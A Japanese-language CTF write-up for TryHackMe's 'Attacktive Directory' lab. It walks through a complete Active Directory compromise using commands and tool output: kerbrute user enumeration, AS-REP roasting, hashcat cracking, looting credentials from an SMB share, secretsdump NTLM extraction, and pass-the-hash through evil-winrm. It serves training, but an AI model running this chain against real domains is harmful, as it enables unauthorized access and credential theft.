# Attactive Directory CTF

https://tryhackme.com/room/attacktivedirectory

## ドメイン名を取得

```sh
$ enum4linux -a 10.10.249.47
```

## ユーザーアカウント列挙

https://github.com/ropnop/kerbrute

```sh
$ ./kerbrute_linux_amd64 userenum --dc 10.10.249.47 -d THM-AD ./userlist.txt

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 06/05/25 - Ronnie Flathers @ropnop

2025/06/05 16:52:35 >  Using KDC(s):
2025/06/05 16:52:35 >   10.10.249.47:88

2025/06/05 16:52:35 >  [+] VALID USERNAME:       james@THM-AD
2025/06/05 16:52:40 >  [+] VALID USERNAME:       svc-admin@THM-AD
2025/06/05 16:52:46 >  [+] VALID USERNAME:       James@THM-AD
2025/06/05 16:52:48 >  [+] VALID USERNAME:       robin@THM-AD
2025/06/05 16:53:10 >  [+] VALID USERNAME:       darkstar@THM-AD
2025/06/05 16:53:24 >  [+] VALID USERNAME:       administrator@THM-AD
2025/06/05 16:53:52 >  [+] VALID USERNAME:       backup@THM-AD
2025/06/05 16:54:04 >  [+] VALID USERNAME:       paradox@THM-AD
2025/06/05 16:55:29 >  [+] VALID USERNAME:       JAMES@THM-AD
2025/06/05 16:55:56 >  [+] VALID USERNAME:       Robin@THM-AD
2025/06/05 16:58:43 >  [+] VALID USERNAME:       Administrator@THM-AD
2025/06/05 17:04:18 >  [+] VALID USERNAME:       Darkstar@THM-AD
2025/06/05 17:06:04 >  [+] VALID USERNAME:       Paradox@THM-AD
2025/06/05 17:12:03 >  [+] VALID USERNAME:       DARKSTAR@THM-AD
2025/06/05 17:13:46 >  [+] VALID USERNAME:       ori@THM-AD
2025/06/05 17:16:56 >  [+] VALID USERNAME:       ROBIN@THM-AD
2025/06/05 17:24:47 >  Done! Tested 73317 usernames (16 valid) in 1932.169 seconds
```

## ASREPRoasting 攻撃によるチケット取得

```sh
$ python3 /home/kali/tools/impacket/examples/GetNPUsers.py 'THM-AD/' -usersfile names.txt -no-pass -dc-ip 10.10.249.47
/home/kali/myenv/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.13.0.dev0+20250605.14806.5f78065c - Copyright Fortra, LLC and its affiliated companies

[-] User james doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc-admin@THM-AD:37cc03[REDACTED]
[-] User James doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User robin doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User darkstar doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User backup doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User paradox doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User JAMES doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Robin doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Darkstar doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Paradox doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User DARKSTAR doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ori doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ROBIN doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] invalid principal syntax
```

ハッシュクラック。

```sh
$ hashcat -m 18200 ./hash.txt ./passwordlist.txt
```

## SMB 列挙

パスワードを使って SMB 列挙。

```sh
$ smbclient -L=10.10.249.47 -U=THM-AD/svc-admin
Password for [THM-AD\svc-admin]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backup          Disk
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        SYSVOL          Disk      Logon server share
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.249.47 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

ファイル取得。

```sh
$ smbclient //10.10.249.47/backup -U THM-AD\\svc-admin
Password for [THM-AD\svc-admin]:
Try "help" to get a list of possible commands.
smb: \> ls -al
NT_STATUS_NO_SUCH_FILE listing \-al
smb: \> ls
  .                                   D        0  Sun Apr  5 04:08:39 2020
  ..                                  D        0  Sun Apr  5 04:08:39 2020
  backup_credentials.txt              A       48  Sun Apr  5 04:08:53 2020

                8247551 blocks of size 4096. 3643449 blocks available
smb: \> get backup_credentials.txt
getting file \backup_credentials.txt of size 48 as backup_credentials.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
```

このファイルに、backup ユーザーの認証情報が含まれていた。

## NTLM ハッシュ抽出

リモートハッシュ抽出

```sh
$ python3 /home/kali/tools/impacket/examples/secretsdump.py -just-dc-ntlm THM-AD/backup@10.10.249.47
/home/kali/myenv/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.13.0.dev0+20250605.14806.5f78065c - Copyright Fortra, LLC and its affiliated companies

Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:[REDACTED]:::

[REDACTED]

[*] Cleaning up...
```

Pass the hash

```sh
$ evil-winrm -i 10.10.249.47 -u Administrator -H [REDACTED]

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

Administrator としてログイン成功。
